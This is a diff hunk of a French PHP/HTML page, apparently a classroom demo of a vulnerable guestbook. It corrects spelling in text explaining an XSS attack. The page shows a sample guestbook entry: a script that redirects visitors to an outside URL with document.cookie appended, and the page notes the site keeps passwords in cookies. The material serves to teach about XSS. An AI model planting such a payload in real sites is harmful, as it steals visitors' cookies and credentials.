@@ -41,7 +41,7 @@ foreach ($result as $ligne){
 <p> Ce site stocke votre mot de passe dans un cookie</p>
 <h3>Exemple d'attaque XSS</h3>
 <input style="width:100%" value="<script>document.location=\'https://github.com/pirahna93/pirahna93.github.io.git\'+document.cookie</script>">
-<p>En ajoutant ce srcipt comme entre du livre d'or;
+<p>En ajoutant ce script comme entrée du livre d'or;
     <ul>
         <li>vous créez une redirection vers mon script malveillant</li>
    
